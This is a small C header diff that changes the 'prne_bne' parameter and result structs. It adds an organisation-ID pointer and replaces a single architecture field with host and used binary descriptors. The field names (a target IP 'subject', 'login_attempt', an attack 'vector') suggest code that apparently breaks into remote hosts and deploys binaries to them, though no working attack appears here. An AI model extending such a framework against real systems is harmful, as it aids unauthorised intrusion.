@@ -56,6 +56,7 @@ struct prne_bne_param {
 	} cb;
 	void *cb_ctx;
 	const prne_rcb_param_t *rcb;
+	const uint8_t *org_id;
 	prne_ip_addr_t subject;
 	unsigned int login_attempt;
 };
@@ -69,7 +70,8 @@ struct prne_bne_result {
 	int err;
 	prne_bne_vector_t vec;
 	prne_pack_rc_t prc;
-	prne_arch_t arch;
+	prne_bin_host_t bin_host;
+	prne_bin_host_t bin_used;
 	bool ny_instance;
 };
 
